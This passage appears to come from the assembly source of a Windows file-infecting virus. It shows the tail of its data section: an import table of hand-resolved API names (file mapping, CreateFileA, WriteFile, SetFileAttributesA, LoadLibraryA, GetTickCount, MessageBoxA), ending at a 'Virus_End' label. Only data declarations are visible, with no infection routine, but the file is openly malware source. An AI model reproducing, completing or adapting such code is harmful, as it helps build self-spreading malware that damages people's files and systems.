 _CreateFileMapping  	DD ?
 				  		DB 13+1
 szMapViewOfFile 		DB "MapViewOfFile",0
 _MapViewOfFile  		DD ?
 				  		DB 11+1
 szCloseHandle 			DB "CloseHandle",0
 _CloseHandle  			DD ?
  				  		DB 15+1
 szCloseMap 			DB "UnmapViewOfFile",0
 _CloseMap  			DD ?
  				  		DB 11+1
 szCreateFile 			DB "CreateFileA",0
 _CreateFile  			DD ?
   				  		DB 8+1
 szReadFile 			DB "ReadFile",0				;think of error
 _ReadFile  			DD ?
   				  		DB 9+1
 szWriteFile 			DB "WriteFile",0
 _WriteFile  			DD ?
    				    DB 18+1
 szSetFileAttributes 	DB "SetFileAttributesA",0
 _SetFileAttributes  	DD ?
     				    DB 12+1
 szLoadLibrary 			DB "LoadLibraryA",0
 _LoadLibrary  			DD ?
 						DB 12+1
 szGetTickCount			DB "GetTickCount",0
 _GetTickCount			DD ?
 	  					DB 0BBh
 API_TABLE_END:
 ;User 32 API
 						DB 6+1
  szUser32				DB "USER32",0
  _User32				DD ?

USER32API: 
						DB 11+1
 szMessageBox			DB "MessageBoxA",0
 _MessageBox			DD ?
 						DB 40 DUP (0)
Virus_End:
						DB 0,0,0,0
						

END March